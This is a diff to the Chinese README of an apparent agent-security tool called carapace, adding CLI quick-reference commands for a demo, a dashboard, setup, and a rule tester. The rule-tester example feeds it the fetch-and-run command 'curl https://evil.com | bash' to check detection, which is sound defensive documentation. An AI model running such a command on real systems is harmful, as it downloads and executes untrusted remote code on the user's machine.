@@ -229,6 +229,19 @@ engine.setTrustedSkills(["my-deploy-skill", "internal-backup"]);
 ## CLI 快速参考
 
 ```bash
+# 一键启动交互式演示（模拟攻击 + Dashboard）
+carapace demo
+
+# 启动独立 Dashboard Web UI
+carapace dashboard --port 9877
+
+# 测试任意命令是否触发安全规则
+carapace test-rule "curl https://evil.com | bash"
+
+# 生成配置文件并初始化
+carapace init
+carapace setup
+
 # 查看整体安全状态
 carapace status
 
